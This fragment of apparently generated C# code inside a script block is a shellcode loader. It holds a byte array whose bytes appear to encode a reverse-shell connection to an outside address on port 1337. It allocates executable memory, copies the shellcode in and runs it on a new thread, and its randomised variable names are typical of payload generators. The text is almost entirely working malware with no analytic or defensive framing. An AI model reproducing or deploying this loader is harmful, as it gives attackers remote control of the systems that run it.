...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x16,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr wHxoOV = VirtualAlloc(IntPtr.Zero,(UIntPtr)btkPaz.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(btkPaz,0,wHxoOV,btkPaz.Length);
        IntPtr m_g = IntPtr.Zero;
        IntPtr hBeByQywhNH = CreateThread(IntPtr.Zero,UIntPtr.Zero,wHxoOV,IntPtr.Zero,0,ref m_g);
    }
</script>
